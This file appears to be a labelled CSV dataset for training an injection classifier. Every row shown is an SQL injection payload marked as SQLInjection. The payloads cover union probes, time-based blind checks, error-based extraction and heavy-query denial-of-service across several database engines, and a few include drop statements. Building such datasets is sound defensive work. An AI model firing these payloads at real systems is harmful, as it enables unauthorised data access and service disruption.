Sentence,SQLInjection,XSS,Normal
1' )  and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( 'lnte' = 'lnte,1,0,0
"1'  )  )   union all select null,null,null,null,null,null,null,null,null--",1,0,0
"-8636""  )  )   )  union all select 1821,1821,1821,1821,1821,1821,1821,1821,1821,1821--",1,0,0
"-6940' )  union all select 3042,3042,3042,3042,3042#",1,0,0
"1"" )  as rnjx where 2679 = 2679 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1,0,0
1 )  as qgsb where 7600 = 7600 and 2006 = 2006,1,0,0
1' where 4795 = 4795 and 4595 = 4595#,1,0,0
"1"" )  as rnte where 6517 = 6517 and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,0,0
"1"" and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) ",1,0,0
"1 )  as ghew where 6441 = 6441 union all select null,null--",1,0,0
"-2548""  )  )   )  or 5107 = 8049--",1,0,0
1' order by 1#,1,0,0
"1"" )  where 2834 = 2834  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users ) --",1,0,0
"-1963 union all select 6831,6831,6831,6831,6831,6831,6831,6831#",1,0,0
"1"" or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and ""pxix"" = ""pxix",1,0,0
"1%' and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,0,0
"1'  )  )   )  and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and   (  (   ( 'xngr' = 'xngr",1,0,0
"-6514  )  )   as pbgg where 6841 = 6841 union all select 6841,6841,6841,6841--",1,0,0
"1"" and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and ""twmy"" = ""twmy",1,0,0
select case when 6420 = 7941 then 1 else null end--,1,0,0
"1""  )  )   as qvyu where 5962 = 5962 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 ) --",1,0,0
1' )  and 4595 = 4595#,1,0,0
"1'|| ( select 'ersu' where 4123 = 4123 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,0,0
"1%' or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,0,0
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  (   ( 5432 = 5432",1,0,0
"1""  )  )   and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (  ""bxcb"" like ""bxcb",1,0,0
"1'+ ( select 'iyvn' where 9358 = 9358 or elt ( 6272 = 6272,sleep ( 5  )  )   ) +'",1,0,0
"1'  )  )   or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (  'qgov' = 'qgov",1,0,0
"1,exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 7759 = 7759,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  ",1,0,0
"1"" where 8727 = 8727",1,0,0
 select sleep ( 5 )  and   (  (  'mmvf' like 'mmvf,1,0,0
"1'|| ( select 'jpso' from dual where 9357 = 9357 or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )    )  )  ||'",1,0,0
-6222  )  )   or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (  3230 = 3230,1,0,0
"-4056""  )  )   )  union all select 4363,4363,4363,4363,4363,4363,4363,4363#",1,0,0
"-5207"" where 2050 = 2050 union all select 2050,2050,2050,2050,2050,2050,2050--",1,0,0
"1"" where 4345 = 4345 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --",1,0,0
"1'  )  )   )  and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (   ( 'dhqz' = 'dhqz",1,0,0
"1"" )  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users )  and  ( ""mrsl"" = ""mrsl",1,0,0
"-1339  )  )   )  union all select 2938,2938,2938,2938,2938,2938#",1,0,0
"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#",1,0,0
-8007'  )  )   as bgpp where 9555 = 9555 or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --,1,0,0
"-8491"" where 6107 = 6107 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --",1,0,0
"-5910%'  )  )   )  union all select 5184,5184,5184,5184,5184,5184,5184,5184,5184,5184--",1,0,0
"1"" where 4808 = 4808 union all select null,null,null,null,null,null,null#",1,0,0
-7940' )  union all select 6024--,1,0,0
"1"" )  where 2758 = 2758 union all select null,null,null,null,null,null,null--",1,0,0
1%' and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and '%' = ',1,0,0
"1%""  )  )   )  union all select null#",1,0,0
"1  )  )   )  or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,0,0
 ( select * from  ( select ( sleep ( 5  )  )   ) srmq ) --,1,0,0
"-1681%"" union all select 8180,8180,8180,8180,8180,8180,8180,8180,8180,8180#",1,0,0
"1' )  as ywtu where 3009 = 3009 or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,0,0
"-9622' union all select 7208,7208,7208,7208#",1,0,0
1'|| ( select 'jmao' where 3009 = 3009,1,0,0
"1 )  where 4698 = 4698 and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,0,0
"1'|| ( select 'rfjl' where 2476 = 2476 or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  )  ||'",1,0,0
"1', ( select  ( case when  ( 6894 = 6087 )  then 1 else 6894* ( select 6894 from information_schema.character_sets )  end  )  )  ",1,0,0
"1  )  )   )  and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,0,0
"1"" )  where 9285 = 9285 and 8506 = 8343#",1,0,0
1'+ ( select wgmn where 4368 = 4368 and 7859 = 6151 ) +',1,0,0
 ( select * from  ( select ( sleep ( 5  )  )   ) srmq )  and 'fdgq' = 'fdgq,1,0,0
-6200%'  )  )   or 8077 = 4661,1,0,0
1 )  rlike sleep ( 5 ) #,1,0,0
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual--",1,0,0
1  )  )   )  and sleep ( 5 )  and   (  (   ( 6618 = 6618,1,0,0
"1' )  as mvai where 5856 = 5856 and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  --",1,0,0
1' )  as zxos where 2745 = 2745,1,0,0
"-6846%""  )  )   or  ( 8459 = 8459 ) *4906 and   (  (  ""%"" = """,1,0,0
"1""  )  )   and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (  ""mxnj"" like ""mxnj",1,0,0
"1%"" )  and elt ( 3114 = 3114,sleep ( 5  )  )  #",1,0,0
1  )  )   as sfan where 7176 = 7176 and 7017 = 7358,1,0,0
"1""  )  )   )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( ""xnsj"" like ""xnsj",1,0,0
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (  'tpih' = 'tpih",1,0,0
"1""  )  )   or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and   (  (  ""ozvp"" = ""ozvp",1,0,0
"1"" )  waitfor delay '0:0:5' and  ( ""hhzy"" like ""hhzy",1,0,0
"1' and make_set ( 3445 = 5963,5963 )  and 'wjfw' = 'wjfw",1,0,0
"1"" or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and ""menm"" like ""menm",1,0,0
-7199'|| ( select 'ssty' where 5406 = 5406 order by 1#,1,0,0
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and 'tmdj' like 'tmdj",1,0,0
"1 )  and make_set ( 4593 = 7765,7765 )  and  ( 8517 = 8517",1,0,0
"-9958"" )  as jzvq where 3741 = 3741 union all select 3741,3741,3741#",1,0,0
select  ( case when  ( 6434 = 3877 )  then 6434 else 1/ ( select 0 )  end ) --,1,0,0
"1""  )  )   as rpxd where 4929 = 4929",1,0,0
"-7794"" )  union all select 3910,3910,3910,3910,3910,3910,3910,3910,3910,3910#",1,0,0
1  )  )   as mlpf where 7425 = 7425,1,0,0
1'  )  )   )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (   ( 'jrpk' = 'jrpk,1,0,0
1  )  )   )  waitfor delay '0:0:5'--,1,0,0
"1, ( select  ( case when  ( 6750 = 6750 )  then 1 else 6750* ( select 6750 from information_schema.character_sets )  end  )  )  ",1,0,0
-9336' or 5641 = 9488#,1,0,0
1'|| ( select 'noik' from dual where 9851 = 9851,1,0,0
"1"" where 7045 = 7045",1,0,0
"-3501""  )  )   )  or  ( 6789 = 6990 ) *6990 and   (  (   ( ""jnnc"" like ""jnnc",1,0,0
"1%'  )  )   or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (  '%' = '",1,0,0
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and '%' = '",1,0,0
-5026' or  ( 8459 = 8459 ) *4906 and 'uavj' like 'uavj,1,0,0
"1 )  as wust where 3884 = 3884 and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,0,0
"1"" )  union all select null#",1,0,0
"-3955%'  )  )   union all select 7999,7999,7999,7999,7999,7999,7999,7999,7999#",1,0,0
"1  )  )   as nxdf where 1696 = 1696 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1,0,0
select case when 6229 = 2077 then 1 else null end--,1,0,0
select  ( case when  ( 5569 = 9390 )  then 5569 else 1/ ( select 0 )  end ) --,1,0,0
1' )  where 1363 = 1363,1,0,0
"1 )  union all select null,null,null,null,null,null,null,null,null--",1,0,0
"1'  )  )   procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and   (  (  'wqme' = 'wqme",1,0,0
"1""  )  )   )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (   ( ""gimc"" like ""gimc",1,0,0
"-4373'+ ( select 'rlht' where 2285 = 2285 union all select 2285,2285,2285#",1,0,0
1 or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu ) -- paxv,1,0,0
"1' or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,0,0
"1"" rlike  ( select  ( case when  ( 2724 = 4757 )  then 1 else 0x28 end  )  )   and ""cmsa"" = ""cmsa",1,0,0
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and 'lckw' = 'lckw",1,0,0
"1""  )  )   )  and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( ""kcxw"" = ""kcxw",1,0,0
1 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )  ,1,0,0
"-1891' in boolean mode )  union all select 6680,6680,6680,6680,6680,6680,6680,6680#",1,0,0
"1%""  )  )   ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and   (  (  ""%"" = """,1,0,0
"1""  )  )   as frsd where 6475 = 6475 union all select null,null,null,null,null,null,null,null,null,null--",1,0,0
if ( 3831 = 9321 )  select 3831 else drop function ybru--,1,0,0
"1"" )  where 9861 = 9861",1,0,0
if ( 3490 = 4920 )  select 3490 else drop function hlzt--,1,0,0
"1 )  or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ",1,0,0
"1"" )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and  ( ""pqsp"" = ""pqsp",1,0,0
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg",1,0,0
"1' )  where 3262 = 3262 union all select null,null,null,null,null,null,null,null,null,null#",1,0,0
-2573  )  )   order by 1#,1,0,0
"-2027%"" )  union all select 2048,2048,2048,2048,2048,2048,2048,2048#",1,0,0
1 where 3354 = 3354,1,0,0
"1""  )  )   and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (  ""dtfg"" = ""dtfg",1,0,0
"-3853"" )  where 4626 = 4626 union all select 4626,4626,4626--",1,0,0
"1'+ ( select 'vwzp' where 2729 = 2729 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,0,0
"1' and elt ( 1210 = 1210,sleep ( 5  )  )   and 'ioar' = 'ioar",1,0,0
-3096' or 3821 = 5539 and 'zrth' = 'zrth,1,0,0
1 or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu ) # lwfs,1,0,0
"1 union all select null,null,null,null,null,null,null,null,null--",1,0,0
"1 or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) # msrb",1,0,0
"1' and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and 'ulep' = 'ulep",1,0,0
"-5230"" )  or elt ( 1032 = 1032,3623 )  and  ( ""aivb"" like ""aivb",1,0,0
 ( select * from  ( select ( sleep ( 5  )  )   ) srmq )  and   (  (  'nbzf' like 'nbzf,1,0,0
"-8349 )  union all select 8126,8126#",1,0,0
"1"" )  as buky where 7898 = 7898 or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,0,0
"1"" )  where 4567 = 4567 or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,0,0
"1"" and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) ",1,0,0
"1' )  procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and  ( 'rxxb' = 'rxxb",1,0,0
1 )  where 2232 = 2232,1,0,0
"-3637"" or  ( 8459 = 8459 ) *4906",1,0,0
1'  )  )   )  and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --,1,0,0
"1'  )  )   as xntz where 5801 = 5801 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",1,0,0
"iif ( 2452 = 8999,1,1/0 ) ",1,0,0
1' )  as bihs where 4197 = 4197,1,0,0
"-7531' )  union all select 3072,3072,3072,3072,3072,3072,3072--",1,0,0
"1  )  )   )  union all select null,null,null,null,null,null--",1,0,0
"waitfor delay '0:0:5' and  ( ""ludp"" like ""ludp",1,0,0
1 )  where 7680 = 7680 and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --,1,0,0
1'|| ( select 'fwph' where 3791 = 3791,1,0,0
"1'  )  )   or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (  'xtdj' = 'xtdj",1,0,0
-2981  )  )   or  ( 8459 = 8459 ) *4906 and   (  (  4202 = 4202,1,0,0
1'|| ( select 'tvcy' where 5592 = 5592 order by 1#,1,0,0
"-5320 where 8051 = 8051 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1,0,0
"1%'  )  )   )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (   ( '%' = '",1,0,0
1 where 5691 = 5691 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno ) --,1,0,0
" select sleep ( 5 )  and ""cyrb"" = ""cyrb",1,0,0
1' )  and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and  ( 'jhlj' = 'jhlj,1,0,0
1 )  as oknr where 3228 = 3228,1,0,0
"1""  )  )   )  rlike sleep ( 5 )  and   (  (   ( ""eefg"" = ""eefg",1,0,0
"1"" )  as gtpi where 8100 = 8100 and make_set ( 2678 = 9169,9169 ) --",1,0,0
"1""  )  )   or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  ""lxue"" like ""lxue",1,0,0
"-8490  )  )   union all select 6910,6910,6910,6910,6910,6910#",1,0,0
"1  )  )   )  union all select null,null,null,null,null,null,null--",1,0,0
"1"" union all select null,null,null,null--",1,0,0
"1  )  )   )  or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (   ( 9558 = 9558",1,0,0
"1""  )  )   )  or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( ""jzsb"" = ""jzsb",1,0,0
select case when 1892 = 3646 then 1 else null end--,1,0,0
"-7416"" where 7656 = 7656 order by 1--",1,0,0
"1"" rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and ""tbbk"" like ""tbbk",1,0,0
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5#",1,0,0
"-6747"" or 9323 = 9323#",1,0,0
-1219' )  or 5592 = 4835,1,0,0
"1""  )  )   )  union all select null,null,null,null,null#",1,0,0
"1'  )  )   )  or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (   ( 'cjre' = 'cjre",1,0,0
"-8566"" )  as hnch where 3418 = 3418 union all select 3418,3418,3418,3418,3418,3418,3418#",1,0,0
"-2248'+ ( select wuow where 4421 = 4421 union all select 4421,4421,4421,4421,4421,4421--",1,0,0
"1%'  )  )   )  and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,0,0
1 )  as mtda where 3951 = 3951,1,0,0
"1'  )  )   )  or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and   (  (   ( 'eugs' = 'eugs",1,0,0
1' )  where 7908 = 7908 or sleep ( 5 ) --,1,0,0
"-1438 where 6759 = 6759 union all select 6759,6759#",1,0,0
"iif ( 9190 = 5059,1,1/0 ) ",1,0,0
"1""  )  )   )  and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (   ( ""oohx"" like ""oohx",1,0,0
"1"" where 2365 = 2365 and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,0,0
 ( select chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7812 = 7812 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 )  from dual ) ,1,0,0
1' )  and  ( 1414 = 4775 ) *4775 and  ( 'mlmw' = 'mlmw,1,0,0
"select count ( * )  from generate_series ( 1,5000000 )  and   (  (  'wmoo' like 'wmoo",1,0,0
"1'|| ( select 'bpml' where 7360 = 7360 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   ) ||'",1,0,0
"1' )  where 9221 = 9221 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) --",1,0,0
"1 )  where 9338 = 9338 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )  --",1,0,0
"1 )  as qjbd where 2808 = 2808  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users ) --",1,0,0
